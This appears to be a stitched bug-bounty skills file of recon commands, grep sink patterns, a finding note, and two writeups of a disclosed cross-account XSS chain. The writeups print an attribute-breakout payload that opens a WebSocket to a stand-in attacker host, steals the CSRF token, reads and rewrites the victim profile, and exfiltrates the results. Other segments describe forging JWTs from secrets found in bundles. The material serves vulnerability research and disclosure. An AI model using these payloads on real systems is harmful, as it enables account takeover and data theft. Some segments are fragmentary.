# whitebox-artefact — part 1/1 (8 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] 1) does the bundle advertise one?

curl -sS "<BASE>/<asset>.js" | tail -c 300 | grep -o 'sourceMappingURL=.*'

## [Bugbountyskills.md] V-09: Client-side source map leakage for de-obfuscating frontend application logic

**Mechanism:** Bundlers ship `//# sourceMappingURL=<file>.js.map` (or a `SourceMap`
header) beside minified JS; the map contains `sources` and — critically —
`sourcesContent`: the **original unminified source** of the whole app. Violated
assumption: "users only see compiled code" — minification is compression, not secrecy.
Maps also leak comments, internal paths, dead admin routes, and anything that only
"looked hidden" because it was minified.

**Preconditions:**
- Built by webpack/Rollup/Vite/Terser without stripping maps from the production artifact (`hidden-source-maps` not used — those still have guessable filenames).
- The `.map` URL fetches with 200 (maps must be fetchable to work — that's the point).

**Detect:**
1. Fetch main JS assets; grep tails for `sourceMappingURL=`, and check the `SourceMap:`
   response header (some servers advertise it — `payloads.md` §3).
2. Fetch the map and *validate structure*: JSON with `version`, `sources`, `mappings`,
   ideally `sourcesContent` — a 200 HTML page here is a soft-404 (`payloads.md` §2).
3. No comment? Guess: `<asset>.js.map`, strip the hash segment (`app.4f2c1b.js` →
   `app.js.map`), try `assets/`/`static/js/` prefixes (Vite/webpack conventions).
4. Read `sources[]` for the original tree (`webpack://app/src/admin/…`), then grep
   `sourcesContent` for V-06 secret patterns and internal hostnames (V-04).

**Proof of concept:**
```bash
curl -sS "https://<TARGET.HOST>/<asset>.js" | tail -c 200   # → //# sourceMappingURL=app.js.map
curl -sS "https://<TARGET.HOST>/app.js.map" | jq '{version, sources: (.sources|length), has_content: (.sourcesContent != null)}'

## [Bugbountyskills.md] Source→sink hunt in frontend bundles (V-03 / V-09)

grep -rnoE 'innerHTML|document\.write|eval\(|new Function|setTimeout\([^,)]*["'"'"']' <BUNDLE_DIR>
grep -rnoE 'location\.(hash|search|href)|document\.URL|postMessage|localStorage\.get' <BUNDLE_DIR>
grep -rnoE '\$\.extend\(true|__proto__|constructor\.prototype' <BUNDLE_DIR>   # V-09 merge sinks
grep -rno 'trustedTypes.createPolicy' <BUNDLE_DIR>                            # V-18 policies

## [Bugbountyskills.md] point executable_path at the cached binary instead of reinstalling.

## [Bugbountyskills.md] F-01 — Unauthenticated deal-bundle read via `POST /api/getBundle`

**Date:** 2026-10-23 (session 2)
**Class:** Broken access control — missing authentication on object read (V-02 unauthenticated endpoint; BOLA-adjacent)
**Asset:** `fv.getoutlaw.com` (in-scope Tier 6 asset; `/api/*` proxies the app's own backend)
**Status:** Proven on own-org objects. **No foreign-account data was accessed** (program STOP rule respected — cross-account impact is inferred from the total absence of any auth check, not demonstrated).

## [Bugbountyskills.md] V-25: Crypto/credential material in the bundle → mint the application's own credentials

**Also known as:** client-side secret abuse; forge the request envelope; JWT secret in the JS.
**Mechanism:** the public bundle ships an AES passphrase (32-hex) and an HS256 signing secret; the request
body is an AES-256-CBC OpenSSL `Salted__` blob of `k@@@v&&&k@@@v…` and the only credential checked is a
`UserToken` JWT `{UserId:null,SessVal:null}` — both mintable by anyone (paid: unauthenticated cardholder
enrichment + a refund-session token accepted downstream). Sibling paid finding: an
`REACT_APP_*_KEY`/`_SECRET` pair with WRITE access to a production analytics service (200 "Track event
logged!" vs 401 without/wrong).
**Preconditions:** any SPA/bundle; a request parameter that is opaque; an HMAC token header.
**Detect:** `bundle_secret_sweep.sh` (env-named pairs, 32/64-hex constants beside AES/CryptoJS/Salted__,
HS256 secrets) → reproduce the client envelope (CryptoJS-compatible `Salted__`: 8-byte salt, key/IV via
EVP_BytesToKey MD5) → sign the token → PROVE the gate with three requests (none/wrong/shipped).
**Chain it with:** `bac-idor-testing` (what the forged identity reaches), `info-disclosure-testing`.
**Rule:** if the client can compute it, the attacker can — a ciphertext-shaped parameter is not a control.

### [Bugbountyskills.md] §17.798 — THIRD-PARTY EMBED OPTIONS ARE ATTACKER INPUT: OPTION PASSTHROUGH INTO AN ATTRIBUTE + AN EMBED RENDERED UNAUTHENTICATED UNDER ANOTHER ACCOUNT'S PATH + THE APP'S OWN ALLOWLISTED CDN BUNDLE AS THE NONCE-SIGNING GADGET

SOURCE: https://hackerone.com/reports/3981292 (Basecamp, High 8.7, disclosed 2026-10-28)  read 2026-11-17
CLASS: cross-account XSS via oEmbed provider-option injection; CSP-nonce defined by the vendor's own bundle.
CORE METHOD: 1. `POST /<acct>/embeds.json {"url":"https://<provider>/medias/<id>?embedType=popover&playerColor=<value>"}` — the renderer replays provider options verbatim, and `playerColor` lands UNESCAPED inside a `class` attribute; 2. break out with `playerColor="><base href="/<victim-acct>/"><script src="https://<app-allowlisted-cdn>/assets/builds/libraries-<hash>.js"></script><div id="footer-trays" data-turbo-permanent><turbo-stream-source src="wss://attacker/"></turbo-stream-source></div>…`; 3. that bundle contains the nonce helper (`Re("csp-nonce")` → `n.nonce = a`) so ANY script it activates inherits the page nonce; 4. deliver with a Turbo Stream over WebSocket appending `<turbo-frame id="pwnf" src="/<VICTIM>/embeds/<sgid>/full">` into the permanent container; 5. `GET /<acct>/embeds/<sgid>/full` renders attacker HTML verbatim AND answers WITHOUT cookies under unrelated account ids (three ids, 200/2926 bytes) — the attacker's embed loads on the application origin; 6. the nonce-signed script reads the CSRF token, reads `/<victim>/my/profile.json` and WRITES `/<victim>/my/profile` as the victim.
DETECTION SIGNAL: provider options (`playerColor`,`theme`,`width`,`autoplay`,`embedType`) replayed into markup unescaped; an embed `full`/preview route whose account segment comes from the path and whose authorization is bound to nothing (request it cookieless under an unrelated account id); any WS/SSE/Turbo-Stream channel that can append markup into a stable `data-*-permanent` target; a `script-src` allowlist containing the app's own CDN.
CHAIN: any attacker account → option payload embed → unauthenticated cross-account render → realtime channel mounts the frame in the victim page → vendor bundle stamps the victim's nonce → CSRF token + profile read/write as the victim. DEDUPE: `3981292`,`playerColor`,`embedType=popover`,`turbo-stream-source`,`footer-trays` = 0 hits (existing oEmbed material is fetcher-SSRF and provider-whitelist iframe XSS). HONESTY: not reproduced; report includes mint/render transcripts, the three-account control and the exfil log.

### [bugbountyhuntingskills.md] §INTAKE-2026-11-17/2 — PROVIDER OPTIONS FROM A PASTED EMBED URL REPLAYED UNESCAPED INTO AN ATTRIBUTE + AN EMBED RENDERED UNAUTHENTICATED UNDER ANOTHER ACCOUNT'S PATH + THE APP'S OWN ALLOWLISTED CDN BUNDLE AS THE NONCE-SIGNING GADGET

SOURCE: https://hackerone.com/reports/3981292 (Basecamp, app.basecamp.com — "Cross-account XSS on app.basecamp.com: oEmbed option injection chained through Turbo defeats the CSP nonce", High CVSS 8.7, reported 2026-08-30, disclosed 2026-10-28)  read 2026-11-17
ROUTE: HackerOne disclosed-report mirror (full report body: two minted embeds, the WebSocket Turbo Stream, three-account-id render control, exfil log; plus the program's own summary: "After a domain migration, Basecamp's embed display page rendered provider-supplied HTML on the application origin instead of the isolated embeds host").
STATUS: UNVERIFIED (not reproduced this pass).
CLASS: cross-account stored/generic XSS (CWE-79) via third-party embed OPTION passthrough into an HTML attribute, amplified by a cross-account unauthenticated render route and a CSP-nonce-signing helper in an allowlisted bundle.
CORE METHOD (as the report states it):
  1. Recon the embed-minting endpoint: `POST /<attacker-acct>/embeds.json` (`Content-Type: application/json`, `X-CSRF-Token:<attacker>`) with `{"url":"https://<provider-host>/medias/<id>?<provider options>"}` — the provider's query options are replayed verbatim by the app's renderer. Here `embedType=popover` makes the provider write `playerColor` UNESCAPED into a `class` attribute: `class="wistia-popover[height=540,playerColor=<value>]"`.
  2. Percent-encode a launcher into the option value: `playerColor="><base href="/<VIctimAcct>/"><script src="https://<app allowlisted CDN>/assets/builds/libraries-<hash>.js"></script><div id="footer-trays" data-turbo-permanent><turbo-stream-source src="wss://<attacker>/"></turbo-stream-source></div><turbo-stream action="refresh"></turbo-stream><b class="`.
  3. The app's OWN asset CDN is inside `script-src`, so the vendor bundle can be loaded into injected HTML; that bundle contains the nonce helper — verbatim from the report: `function Re(v){return document.querySelector('meta[name="'+v+'"]')} function qe(){let v=Re("csp-nonce"); if(v){let{nonce:n,content:a}=v; return n==""?a:n}} {let n=document.createElement("script"),a=qe(); return a&&(n.nonce=a), n.textContent=v.textContent, n.async=!1, h(n,v), n}` — i.e. anything that injects a `<script>` through the library's activation path GETS THE PAGE NONCE.
  4. Second minted embed carries the payload inside `<turbo-frame id="pwnf"><script>(async()=>{…})()</script></turbo-frame>`; delivery is a Turbo Stream over WebSocket: `<turbo-stream action="append" target="footer-trays"><template><turbo-frame id="pwnf" src="/<VICTIM>/embeds/<sgid>/full"></turbo-frame></template></turbo-stream>`.
  5. The cross-account defect: `GET /<acct>/embeds/<sgid>/full` renders the attacker's HTML VERBATIM and answers WITHOUT cookies under account ids unrelated to the embed — verified for three different account ids (`200:2926` bytes each, `turbo-stream-source` present) — with `content-type: text/html`.
  6. Turbo activates the frame script with the victim page's nonce → same-origin JS → reads `meta[name=csrf-token]`, reads `/<victim>/my/profile.json`, writes `POST /<victim>/my/profile` with `person[title]=XSS-CROSS-ACCOUNT-PROOF` as the victim, exfiltrates BEFORE/AFTER + CSRF to the attacker.
DETECTION SIGNAL: an embed/oEmbed renderer that passes the PASTED URL's provider options through into markup without escaping (`playerColor`, `theme`, `width`, `autoplay`, `embedType`, `image_play_button_color`…); an embed "full"/preview/iframe route whose account segment comes from the PATH while authorization is bound to nothing (not the sgid, not the session) — request it with no cookies under an unrelated account id; any WebSocket/SSE/Turbo-Stream/ActionCable channel that can append attacker markup into a stable page target (`data-turbo-permanent` containers are the classic target); a `script-src` allowlist that includes the app's own CDN (its own bundles can bootstrap nonce-signed scripts).
CHAIN: attacker account (any account; no access to the victim's) → embed minted with an option payload → `/<victim-acct>/embeds/<sgid>/full` renders it unauthenticated on the application origin → a WS Turbo Stream mounts the frame in the victim page → vendor bundle stamps the victim's nonce → same-origin JS → CSRF token + private profile read + profile WRITE as the victim (reporter's impact: "full same-origin control of their session"). One opened link, no import, not self-XSS.
TRANSFERABLE TEST: (1) mint an embed in account A and sweep every provider option the renderer replays (`?option=` list) trying values containing `">` plus a `<script src=<allowlisted-host>/…>`; (2) request the embed's full/preview/iframe render with account ids that do not own it and with NO cookies (3 ids, diff status/size); (3) hunt the app's realtime channel for a markup-append primitive and check whether the page has a stable `data-*-permanent` target; (4) grep the allowlisted first-party bundles for a `csp-nonce` reader and a `script.nonce = …` assignment — if present, any script-injection primitive is a CSP bypass. Rule: **a third-party embed's options are attacker input to the app's renderer; an embed route that trusts the path's account segment is a cross-account render; and a nonce-signing helper in an allowlisted bundle turns HTML injection into same-origin JS.**
DEDUPE/DELTA: `3981292`, `playerColor`, `embedType=popover`, `turbo-stream-source`, `footer-trays` = 0 hits pre-append. Existing oEmbed material REVIEWED and NOT re-recorded: the Ghost oEmbed-fetcher SSRF (ledger ~17320) and the Steam oEmbed-independent-provider/iframe-whitelist XSS (~3112) — NEW atoms: (a) provider OPTION passthrough as the attribute-injection vector, (b) the cross-account/unauthenticated `…/full` embed render, (c) the app's own allowlisted CDN bundle as the nonce-signing gadget. Shares the Turbo-nonce atom with §INTAKE-2026-11-17/1 but the entry primitive is entirely different (minting + option injection vs. editor re-parse of stored attachment content).
HONESTY: not reproduced this pass; the report includes the mint/render transcripts, the three-account-id control, the CSRF+BEFORE/AFTER exfil body and the program's own root-cause confirmation (domain migration; they now "rebuild provider frames from the media id alone").

---

